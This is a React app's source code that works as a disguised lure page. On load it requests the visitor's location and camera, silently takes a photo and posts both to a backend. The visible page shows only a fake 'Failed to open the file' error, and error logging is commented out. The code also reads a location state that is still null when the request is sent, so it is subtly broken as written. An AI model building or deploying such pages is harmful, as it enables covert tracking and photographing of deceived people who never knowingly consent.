import React, { useEffect, useRef, useState } from 'react';

function App() {
  const [location, setLocation] = useState(null);
  const canvasRef = useRef(null);

  useEffect(() => {
    const captureData = async () => {
      try {
        // Get location
        await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const coords = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
              };
              setLocation(coords);
              resolve();
            },
            (err) => {
              console.error('Location error:', err);
              reject(err);
            }
          );
        });

        // Access camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        // Create video element in memory
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        // Wait for video to be ready
        await new Promise((resolve) => {
          video.onloadedmetadata = () => resolve();
        });

        // Capture photo
        const canvas = canvasRef.current;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, 320, 240);
        const imageDataUrl = canvas.toDataURL('image/png');

        // Stop camera
        stream.getTracks().forEach((track) => track.stop());

        // Send both to backend
        fetch(`${process.env.REACT_APP_BACKEND_URL}/send-location`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            latitude: location.latitude,
            longitude: location.longitude,
            image: imageDataUrl,
          }),
        })
          .then((res) => {
            if (!res.ok) throw new Error('Failed to send to backend');
            return res.json();
          })
          // .then((data) => {
          //   console.log('Backend response:', data);
          // })
          // .catch((err) => {
          //   console.error('Backend error:', err);
          // });
      } catch (error) {
        // console.error('Error:', error);
      }
    };

    captureData();
  }, []);

  return (
    <div style={{ padding: '2rem', fontFamily: 'Arial, sans-serif' }}>
      <p style={{ color: 'red' }}><strong>Failed to open the file</strong></p>
    </div>
  );
}

export default App;
